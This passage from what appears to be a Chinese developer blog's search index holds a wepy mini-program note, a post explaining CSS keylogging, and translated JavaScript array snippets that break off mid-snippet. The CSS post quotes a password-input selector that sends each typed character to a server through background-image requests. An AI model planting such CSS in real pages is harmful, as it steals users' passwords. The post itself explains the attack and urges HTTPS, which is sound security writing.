href="https://blog.csdn.net/juzipidemimi/article/details/81807110">https://blog.csdn.net/juzipidemimi/article/details/81807110</a></p><p>需要注意的是，我是将开源中的项目down下来直接复制了charts文件夹，其中每一个charts的组件中，存在一个initChart方法，它是用来代替原来的ec:{}，原理在文章中有写，这个方法被写在了methods(){}中，如果你想通过后台数据实现动态刷新图表，可以使用ES7的async将你的request变为异步函数，最后在.then中进行initChart，否则如果请求的时间在initChart之后，图表是不会渲染出来的，因为数据没有请求到。</p><p>目前项目顺利开发完成，上传的dist目录结构：</p><p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/20181228094022460.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/20181228094022460.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>注：index.template.html不会被上传</p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WeChat </tag>
            
            <tag> wepy </tag>
            
            <tag> minUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Css 获取用户密码</title>
      <link href="2018/09/27/%E4%BD%BF%E7%94%A8%20Css%20%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/"/>
      <url>2018/09/27/%E4%BD%BF%E7%94%A8%20Css%20%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 github 上闲逛，发现了一个很有趣的项目，叫 CSS-Keylogging，这是一个演示如何用 css 去获取用户输入的密码的项目，这个项目与之前前的另外一个很火的项目 CrookedStyleSheets 类似，甚至于有可能 CSS-Keylogging 就是受 CrookedStyleSheets 启发才创建的。</p><h2 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h2><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p><p>话题回到不一样的 css 上，github 上 jbtronics 给出了这样一份答案 CrookedStyleSheets，在这里笔者直接给上该项目的中文文档，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p><h2 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h2><p>CSS-Keylogging 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，CSS-Keylogging 更为巧妙的使用多重选择器去捕获相应的按键事件。</p><p>核心代码如下:</p><p><code>input[type=&quot;password&quot;][value$=&quot;1&quot;] &#123; background-image: url(&quot;http://localhost:3000/1&quot;); &#125;</code></p><p>解释如下</p><p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <a href="http://localhost:3000/1">http://localhost:3000/1</a> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p><p>当 value$=”1” 时，我们可以监听用户输入 1，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p><p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/code.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/code.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="css" title="css"></p><p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p><p>##总结</p><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>30s代码片段翻译</title>
      <link href="2018/08/12/30s%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%E7%BF%BB%E8%AF%91/"/>
      <url>2018/08/12/30s%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%E7%BF%BB%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><h4 id="Array-concatenation-合并参数"><a href="#Array-concatenation-合并参数" class="headerlink" title="Array concatenation (合并参数)"></a>Array concatenation (合并参数)</h4><p>使用 Array.concat() 来连接参数中的任何数组或值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arrayConcat = <span class="function">(<span class="params">arr, ...args</span>) =&gt;</span> arr.concat(...args);</span><br><span class="line"><span class="comment">// arrayConcat([1], 2, [3], [[4]]) -&gt; [1,2,3,[4]]</span></span><br></pre></td></tr></table></figure><h3 id="Array-difference-取数组不同项"><a href="#Array-difference-取数组不同项" class="headerlink" title="Array difference (取数组不同项)"></a>Array difference (取数组不同项)</h3><p>以 <code>b</code> 创建 <code>Set</code>，然后使用 <code>Array.filter()</code> 过滤，只保留 <code>b</code> 中不包含的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> difference = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123; <span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>(b); <span class="keyword">return</span> a.filter(<span class="function"><span class="params">x</span> =&gt;</span> !s.has(x)); &#125;;</span><br><span class="line"><span class="comment">// difference([1,2,3], [1,2]) -&gt; [3]</span></span><br></pre></td></tr></table></figure><h3 id="Array-intersection-取数组相同项"><a href="#Array-intersection-取数组相同项" class="headerlink" title="Array intersection (取数组相同项)"></a>Array intersection (取数组相同项)</h3><p>以 <code>b</code> 创建 <code>Set</code>，然后使用 <code>Array.filter()</code> 过滤，只保留 <code>b</code> 中包含的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> intersection = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123; <span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>(b); <span class="keyword">return</span> a.filter(<span class="function"><span class="params">x</span> =&gt;</span> s.has(x)); &#125;;</span><br><span class="line"><span class="comment">// intersection([1,2,3], [4,3,2]) -&gt; [2,3]</span></span><br></pre></td></tr></table></figure><h3 id="Array-union-合并数组去重"><a href="#Array-union-合并数组去重" class="headerlink" title="Array union (合并数组去重)"></a>Array union (合并数组去重)</h3><p>用 <code>a</code> 和 <code>b</code> 的所有值创建一个 <code>Set</code> 并转换成一个数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> union = <span class="function">(<span class="params">a, b</span>) =&gt;</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>([...a, ...b]));</span><br><span class="line"><span class="comment">// union([1,2,3], [4,3,2]) -&gt; [1,2,3,4]</span></span><br></pre></td></tr></table></figure><h3 id="Average-of-array-of-numbers-通过数组取平均值"><a href="#Average-of-array-of-numbers-通过数组取平均值" class="headerlink" title="Average of array of numbers (通过数组取平均值)"></a>Average of array of numbers (通过数组取平均值)</h3><p>使用 Array.reduce() 将每个值添加到一个累加器，用值 0 初始化，除以数组的长度。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> average = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc + val, <span class="number">0</span>) / arr.length;</span><br><span class="line"><span class="comment">// average([1,2,3]) -&gt; 2</span></span><br></pre></td></tr></table></figure><h3 id="Chunk-array-数组切块"><a href="#Chunk-array-数组切块" class="headerlink" title="Chunk array (数组切块)"></a>Chunk array (数组切块)</h3><p>使用 <code>Array.from()</code> 创建一个满足块的数量的新的数组。<br>使用 <code>Array.slice()</code> 将新数组的每个元素映射到 <code>size</code> 长度的块。<br>如果原始数组不能均匀分割，最后的块将包含剩余的元素。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chunk = <span class="function">(<span class="params">arr, size</span>) =&gt;</span></span><br><span class="line"><span class="built_in">Array</span>.from(&#123;<span class="attr">length</span>: <span class="built_in">Math</span>.ceil(arr.length / size)&#125;, <span class="function">(<span class="params">v, i</span>) =&gt;</span> arr.slice(i * size, i * size + size));</span><br><span class="line"><span class="comment">// chunk([1,2,3,4,5], 2) -&gt; [[1,2],[3,4],5]</span></span><br></pre></td></tr></table></figure><h3 id="Compact-压缩"><a href="#Compact-压缩" class="headerlink" title="Compact (压缩)"></a>Compact (压缩)</h3><p>使用 <code>Array.filter()</code> 去过滤掉假值（<code>false, null, 0, &quot;&quot;, undefined 和 NaN</code>）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> compact = <span class="function">(<span class="params">arr</span>) =&gt;</span> arr.filter(<span class="function"><span class="params">v</span> =&gt;</span> v);</span><br><span class="line"><span class="comment">// compact([0, 1, false, 2, &#x27;&#x27;, 3, &#x27;a&#x27;, &#x27;e&#x27;*23, NaN, &#x27;s&#x27;, 34]) -&gt; [ 1, 2, 3, &#x27;a&#x27;, &#x27;s&#x27;, 34 ]</span></span><br></pre></td></tr></table></figure><h3 id="Count-occurrences-of-a-value-in-array-计算数组中指定值出现的次数"><a href="#Count-occurrences-of-a-value-in-array-计算数组中指定值出现的次数" class="headerlink" title="Count occurrences of a value in array (计算数组中指定值出现的次数)"></a>Count occurrences of a value in array (计算数组中指定值出现的次数)</h3><p>使用 <code>Array.reduce()</code> 去迭代数组，当值相同时，递增计数器。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> countOccurrences = <span class="function">(<span class="params">arr, value</span>) =&gt;</span> arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> v === value ? a + <span class="number">1</span> : a + <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// countOccurrences([1,1,2,1,2,3], 1) -&gt; 3</span></span><br></pre></td></tr></table></figure><h3 id="Deep-flatten-array-深度展开数组"><a href="#Deep-flatten-array-深度展开数组" class="headerlink" title="Deep flatten array (深度展开数组)"></a>Deep flatten array (深度展开数组)</h3><p>使用递归。<br>使用 <code>Array.reduce()</code> 获取所有不是数组的值，并将数组展开。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> deepFlatten = <span class="function"><span class="params">arr</span> =&gt;</span></span><br><span class="line">arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(<span class="built_in">Array</span>.isArray(v) ? deepFlatten(v) : v), []);</span><br><span class="line"><span class="comment">// deepFlatten([1,[2],[[3],4],5]) -&gt; [1,2,3,4,5]</span></span><br></pre></td></tr></table></figure><h3 id="Drop-elements-in-array-删除数组中的元素"><a href="#Drop-elements-in-array-删除数组中的元素" class="headerlink" title="Drop elements in array (删除数组中的元素)"></a>Drop elements in array (删除数组中的元素)</h3><p>循环访问数组，使用 <code>Array.shift()</code> 删除数组的第一个元素，直到函数的返回值为 <code>true</code>，返回其余的元素。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dropElements = <span class="function">(<span class="params">arr, func</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (arr.length &gt; <span class="number">0</span> &amp;&amp; !func(arr[<span class="number">0</span>])) arr.shift();</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// dropElements([1, 2, 3, 4], n =&gt; n &gt;= 3) -&gt; [3,4]</span></span><br></pre></td></tr></table></figure><h3 id="Fill-array-填充数组"><a href="#Fill-array-填充数组" class="headerlink" title="Fill array (填充数组)"></a>Fill array (填充数组)</h3><p>使用 <code>Array.map()</code> 将 <code>start（包含）</code> 和 <code>end（不包含）</code> 之间的值映射为 <code>value</code>。<br>省略 <code>start</code> 将从第一个元素开始／省略 <code>end</code> 将在数组最后结束。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fillArray = <span class="function">(<span class="params">arr, value, start = <span class="number">0</span>, end = arr.length</span>) =&gt;</span></span><br><span class="line">arr.map(<span class="function">(<span class="params">v, i</span>) =&gt;</span> i &gt;= start &amp;&amp; i &lt; end ? value : v);</span><br><span class="line"><span class="comment">// fillArray([1,2,3,4],&#x27;8&#x27;,1,3) -&gt; [1,&#x27;8&#x27;,&#x27;8&#x27;,4]</span></span><br></pre></td></tr></table></figure><h3 id="Filter-out-non-unique-values-in-an-array-过滤掉数组中重复的值"><a href="#Filter-out-non-unique-values-in-an-array-过滤掉数组中重复的值" class="headerlink" title="Filter out non-unique values in an array (过滤掉数组中重复的值)"></a>Filter out non-unique values in an array (过滤掉数组中重复的值)</h3><p>使用 <code>Array.filter()</code> 保证数组仅包含唯一值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> filterNonUnique = <span class="function"><span class="params">arr</span> =&gt;</span> arr.filter(<span class="function"><span class="params">i</span> =&gt;</span> arr.indexOf(i) === arr.lastIndexOf(i));</span><br><span class="line"><span class="comment">// filterNonUnique([1,2,2,3,4,4,5]) -&gt; [1,3,5]</span></span><br></pre></td></tr></table></figure><h3 id="Flatten-array-up-to-depth-展开指定深度的数组"><a href="#Flatten-array-up-to-depth-展开指定深度的数组" class="headerlink" title="Flatten array up to depth (展开指定深度的数组)"></a>Flatten array up to depth (展开指定深度的数组)</h3><p>使用递归去递减深度。<br>使用 <code>Array.reduce()</code> 和 <code>Array.concat()</code> 来合并元素或数组。<br>基本情况下，当深度为 1 时停止递归。<br>省略第二个参数，展开深度为 1。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flattenDepth = <span class="function">(<span class="params">arr, depth = <span class="number">1</span></span>) =&gt;</span></span><br><span class="line">depth != <span class="number">1</span> ? arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(<span class="built_in">Array</span>.isArray(v) ? flattenDepth(v, depth - <span class="number">1</span>) : v), [])</span><br><span class="line">    : arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(v), []);</span><br><span class="line"><span class="comment">// flattenDepth([1,[2],[[[3],4],5]], 2) -&gt; [1,2,[3],4,5]</span></span><br></pre></td></tr></table></figure><h3 id="Flatten-array-拼合数组"><a href="#Flatten-array-拼合数组" class="headerlink" title="Flatten array (拼合数组)"></a>Flatten array (拼合数组)</h3><p>使用 <code>Array.reduce()</code> 来获取内部所有元素并用 <code>concat()</code> 合并它们。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flatten = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(v), []);</span><br><span class="line"><span class="comment">// flatten([1,[2],3,4]) -&gt; [1,2,3,4]</span></span><br></pre></td></tr></table></figure><h3 id="Get-max-value-from-array-获取数组中的最大值"><a href="#Get-max-value-from-array-获取数组中的最大值" class="headerlink" title="Get max value from array (获取数组中的最大值)"></a>Get max value from array (获取数组中的最大值)</h3><p>使用 <code>Math.max()</code> 配合 … 扩展运算符去获取数组中的最大值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arrayMax = <span class="function"><span class="params">arr</span> =&gt;</span> <span class="built_in">Math</span>.max(...arr);</span><br><span class="line"><span class="comment">// arrayMax([10, 1, 5]) -&gt; 10</span></span><br></pre></td></tr></table></figure><h3 id="Get-min-value-from-array-获取数组中的最小值"><a href="#Get-min-value-from-array-获取数组中的最小值" class="headerlink" title="Get min value from array (获取数组中的最小值)"></a>Get min value from array (获取数组中的最小值)</h3><p>使用 Math.max() 配合 … 扩展运算符去获取数组中的最小值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arrayMin = <span class="function"><span class="params">arr</span> =&gt;</span> <span class="built_in">Math</span>.min(...arr);</span><br><span class="line"><span class="comment">// arrayMin([10, 1, 5]) -&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="Group-by-条件分组"><a href="#Group-by-条件分组" class="headerlink" title="Group by (条件分组)"></a>Group by (条件分组)</h3><p>使用 Array.map() 将数组的值映射到函数或属性名称。<br>使用 Array.reduce() 创建一个对象，其中的键是从映射的结果中产生的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> groupBy = <span class="function">(<span class="params">arr, func</span>) =&gt;</span></span><br><span class="line">arr.map(<span class="keyword">typeof</span> func === <span class="string">&#x27;function&#x27;</span> ? func : <span class="function"><span class="params">val</span> =&gt;</span> val[func])</span><br><span class="line">.reduce(<span class="function">(<span class="params">acc, val, i</span>) =&gt;</span> &#123; acc[val] = (acc[val] || []).concat(arr[i]); <span class="keyword">return</span> acc; &#125;, &#123;&#125;);</span><br><span class="line"><span class="comment">// groupBy([6.1, 4.2, 6.3], Math.floor) -&gt; &#123;4: [4.2], 6: [6.1, 6.3]&#125;</span></span><br><span class="line"><span class="comment">// groupBy([&#x27;one&#x27;, &#x27;two&#x27;, &#x27;three&#x27;], &#x27;length&#x27;) -&gt; &#123;3: [&#x27;one&#x27;, &#x27;two&#x27;], 5: [&#x27;three&#x27;]&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Head-of-list-获取数组的首个元素"><a href="#Head-of-list-获取数组的首个元素" class="headerlink" title="Head of list (获取数组的首个元素)"></a>Head of list (获取数组的首个元素)</h3><p>使用 arr[0] 返回传递数组的第一个元素。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> head = <span class="function"><span class="params">arr</span> =&gt;</span> arr[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// head([1,2,3]) -&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="Initial-of-list"><a href="#Initial-of-list" class="headerlink" title="Initial of list"></a>Initial of list</h3><p>使用 arr,slice(0, -1) 去返回去除最后一个元素的数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> initial = <span class="function"><span class="params">arr</span> =&gt;</span> arr.slice(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="comment">// initial([1,2,3]) -&gt; [1,2]</span></span><br></pre></td></tr></table></figure><h3 id="Initialize-array-with-range-使用指定范围来定义数组"><a href="#Initialize-array-with-range-使用指定范围来定义数组" class="headerlink" title="Initialize array with range (使用指定范围来定义数组)"></a>Initialize array with range (使用指定范围来定义数组)</h3><p>使用 Array(end-start) 创建一个所需长度的数组，使用 Array.map() 来填充范围中的所需值。<br>你可以省略start，默认值为 0。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> initializeArrayRange = <span class="function">(<span class="params">end, start = <span class="number">0</span></span>) =&gt;</span></span><br><span class="line"><span class="built_in">Array</span>.apply(<span class="literal">null</span>, <span class="built_in">Array</span>(end - start)).map(<span class="function">(<span class="params">v, i</span>) =&gt;</span> i + start);</span><br><span class="line"><span class="comment">// initializeArrayRange(5) -&gt; [0,1,2,3,4]</span></span><br></pre></td></tr></table></figure><h3 id="Initialize-array-with-values-使用指定值来定义数组"><a href="#Initialize-array-with-values-使用指定值来定义数组" class="headerlink" title="Initialize array with values (使用指定值来定义数组)"></a>Initialize array with values (使用指定值来定义数组)</h3><p>使用 Array(n) 创建一个所需长度的数组，使用 fill(v) 去填充所需要的值。<br>亦可以省略 value，默认值为 0。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> initializeArray = <span class="function">(<span class="params">n, value = <span class="number">0</span></span>) =&gt;</span> <span class="built_in">Array</span>(n).fill(value);</span><br><span class="line"><span class="comment">// initializeArray(5, 2) -&gt; [2,2,2,2,2]</span></span><br></pre></td></tr></table></figure><h3 id="Last-of-list-获取数组的结尾"><a href="#Last-of-list-获取数组的结尾" class="headerlink" title="Last of list (获取数组的结尾)"></a>Last of list (获取数组的结尾)</h3><p>使用 arr.slice(-1)[0] 获得给定数组的最后一个元素。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> last = <span class="function"><span class="params">arr</span> =&gt;</span> arr.slice(-<span class="number">1</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// last([1,2,3]) -&gt; 3</span></span><br></pre></td></tr></table></figure><h3 id="Median-of-array-of-numbers-获取数组的中间值"><a href="#Median-of-array-of-numbers-获取数组的中间值" class="headerlink" title="Median of array of numbers (获取数组的中间值)"></a>Median of array of numbers (获取数组的中间值)</h3><p>找到数组的中间，使用 Array.sort() 对值进行排序。<br>如果长度是奇数，则返回中点处的数字，否则返回两个中间数字的平均值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> median = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">const</span> mid = <span class="built_in">Math</span>.floor(arr.length / <span class="number">2</span>), nums = arr.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    <span class="keyword">return</span> arr.length % <span class="number">2</span> !== <span class="number">0</span> ? nums[mid] : (nums[mid - <span class="number">1</span>] + nums[mid]) / <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// median([5,6,50,1,-5]) -&gt; 5</span></span><br><span class="line"><span class="comment">// median([0,10,-2,7]) -&gt; 3.5</span></span><br></pre></td></tr></table></figure><h3 id="Nth-element-of-array-获取数组的第-N-个元素"><a href="#Nth-element-of-array-获取数组的第-N-个元素" class="headerlink" title="Nth element of array (获取数组的第 N 个元素)"></a>Nth element of array (获取数组的第 N 个元素)</h3><p>使用 Array.slice() 得到一个包含第一个元素的数组。<br>如果索引超出范围，则返回 []。（译者注：超过索引返回 undefind）<br>省略第二个参数 n 来获取数组的第一个元素。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nth = <span class="function">(<span class="params">arr, n=<span class="number">0</span></span>) =&gt;</span> (n&gt;<span class="number">0</span>? arr.slice(n,n+<span class="number">1</span>) : arr.slice(n))[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// nth([&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;],1) -&gt; &#x27;b&#x27;</span></span><br><span class="line"><span class="comment">// nth([&#x27;a&#x27;,&#x27;b&#x27;,&#x27;b&#x27;]-2) -&gt; &#x27;a&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Pick-挑选"><a href="#Pick-挑选" class="headerlink" title="Pick (挑选)"></a>Pick (挑选)</h3><p>使用 Array.reduce() 去过滤／挑选存在于 obj 中的 key 值，并转换回相应的键值对的对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pick = <span class="function">(<span class="params">obj, arr</span>) =&gt;</span></span><br><span class="line">arr.reduce(<span class="function">(<span class="params">acc, curr</span>) =&gt;</span> (curr <span class="keyword">in</span> obj &amp;&amp; (acc[curr] = obj[curr]), acc), &#123;&#125;);</span><br><span class="line"><span class="comment">// pick(&#123; &#x27;a&#x27;: 1, &#x27;b&#x27;: &#x27;2&#x27;, &#x27;c&#x27;: 3 &#125;, [&#x27;a&#x27;, &#x27;c&#x27;]) -&gt; &#123; &#x27;a&#x27;: 1, &#x27;c&#x27;: 3 &#125;</span></span><br><span class="line"><span class="comment">// pick(object, [&#x27;a&#x27;, &#x27;c&#x27;])[&#x27;a&#x27;] -&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="Shuffle-array-随机数组"><a href="#Shuffle-array-随机数组" class="headerlink" title="Shuffle array (随机数组)"></a>Shuffle array (随机数组)</h3><p>使用 Array.sort() 在比较器中使用 Math.random() 重新排序元素。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> shuffle = <span class="function"><span class="params">arr</span> =&gt;</span> arr.sort(<span class="function">() =&gt;</span> <span class="built_in">Math</span>.random() - <span class="number">0.5</span>);</span><br><span class="line"><span class="comment">// shuffle([1,2,3]) -&gt; [2,3,1]</span></span><br></pre></td></tr></table></figure><h3 id="Similarity-between-arrays-获取数组的交集"><a href="#Similarity-between-arrays-获取数组的交集" class="headerlink" title="Similarity between arrays (获取数组的交集)"></a>Similarity between arrays (获取数组的交集)</h3><p>使用 filter() 移除不是 values 的一部分的值，使用 includes() 确定。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> similarity = <span class="function">(<span class="params">arr, values</span>) =&gt;</span> arr.filter(<span class="function"><span class="params">v</span> =&gt;</span> values.includes(v));</span><br><span class="line"><span class="comment">// similarity([1,2,3], [1,2,4]) -&gt; [1,2]</span></span><br></pre></td></tr></table></figure><h3 id="Sum-of-array-of-numbers-数组的总和"><a href="#Sum-of-array-of-numbers-数组的总和" class="headerlink" title="Sum of array of numbers (数组的总和)"></a>Sum of array of numbers (数组的总和)</h3><p>使用 Array.reduce() 去迭代值并计算累计器，初始值为 0。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc + val, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// sum([1,2,3,4]) -&gt; 10</span></span><br></pre></td></tr></table></figure><h3 id="Tail-of-list-列表的尾巴"><a href="#Tail-of-list-列表的尾巴" class="headerlink" title="Tail of list (列表的尾巴)"></a>Tail of list (列表的尾巴)</h3><p>如果数组的长度大于1，则返回 arr.slice(1)，否则返回整个数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> tail = <span class="function"><span class="params">arr</span> =&gt;</span> arr.length &gt; <span class="number">1</span> ? arr.slice(<span class="number">1</span>) : arr;</span><br><span class="line"><span class="comment">// tail([1,2,3]) -&gt; 